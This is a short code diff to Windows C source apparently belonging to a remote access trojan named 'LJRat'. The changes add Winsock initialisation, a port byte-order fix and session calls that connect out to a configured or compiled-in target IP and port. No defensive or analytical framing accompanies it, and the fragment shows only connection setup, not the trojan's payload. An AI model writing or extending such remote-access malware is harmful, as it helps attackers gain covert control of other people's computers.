@@ -1,7 +1,11 @@
+#define WIN32_LEAN_AND_MEAN
+
 #include <winsock2.h>
 #include <Windows.h>
 #include "error.h"
 #include "LJRat.h"
+#include "session.h"
+#include "debug.h"
 
 #ifndef BUILD_DLL
 
@@ -54,11 +58,12 @@ EXPORT_FUNC ERROR_T Run(VOID)
     SOCKET sock;
     DWORD dwPort = 0;
     SOCKADDR_IN addr = {0};
+    SESSION session = {0};
 
     iStartup = WSAStartup(MAKEWORD(2,2), &wData);
     if (E_SUCCESS != iStartup)
     {
-        goto cleanup;
+        goto end;
     }
 
 addr.sin_family = AF_INET;
@@ -68,11 +73,13 @@ dwPort = atoi(argv[2]);
 
 if (dwPort < 1 || dwPort > 65535)
 {
-    goto cleanup;
+    goto end;
 }
 
+dwPort = htons(dwPort);
 addr.sin_port = (WORD)dwPort;
 addr.sin_addr.s_addr = inet_addr(argv[1]);
+
 #else
 addr.sin_port = htons(TARGET_PORT);
 addr.sin_addr.s_addr = inet_addr(TARGET_IP);
@@ -80,10 +87,17 @@ addr.sin_addr.s_addr = inet_addr(TARGET_IP);
 
 if (INADDR_NONE == addr.sin_addr.s_addr)
 {
-    goto cleanup;
+    goto end;
 }
 
-cleanup:
+iError = SessionInit(&session, AF_INET, SOCK_STREAM, IPPROTO_TCP);
+if (E_SUCCESS != iError) {
+    goto end;
+}
+
+iError = SessionConnect(&session, &addr);
+
+end:
 if (0 == iStartup)
 {
     WSACleanup();
